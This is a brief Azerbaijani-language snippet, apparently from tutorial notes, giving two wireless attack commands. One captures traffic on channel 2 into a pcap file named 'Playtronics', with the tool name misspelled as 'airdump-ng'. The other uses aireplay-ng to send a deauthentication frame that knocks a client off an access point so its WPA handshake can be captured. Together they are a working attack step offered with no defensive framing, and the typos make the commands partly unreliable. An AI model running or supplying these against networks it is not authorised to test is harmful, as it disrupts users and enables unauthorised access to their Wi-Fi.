Indi ise dump-a kecirib pcap faylini goturek

```
sudo airdump-ng -c 2 -w Playtronics wlan0mon
```

Client-le elaqeni kesib, paketi goturek

```
sudo aireplay-ng -0 1 -a "AP address" -c "cliend address" wlan0mon
```
